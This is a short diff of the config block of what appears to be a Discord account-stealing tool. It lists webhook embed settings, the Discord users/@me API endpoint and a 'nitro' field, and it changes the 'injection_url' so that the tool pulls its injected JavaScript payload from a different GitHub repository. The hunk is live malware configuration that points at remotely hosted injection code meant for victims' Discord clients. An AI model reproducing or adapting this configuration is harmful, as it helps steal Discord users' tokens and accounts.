@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Unthinkable Services', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1054563143247990884/1054580146973192282/purple.jpg', 
   embed_color: 0, 
-  injection_url: 'https://raw.githubusercontent.com/addi00000/empyrean-injection/master/obfuscated.js', 
+  injection_url: 'https://raw.githubusercontent.com/Unthinkable123/asdad/main/clean.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
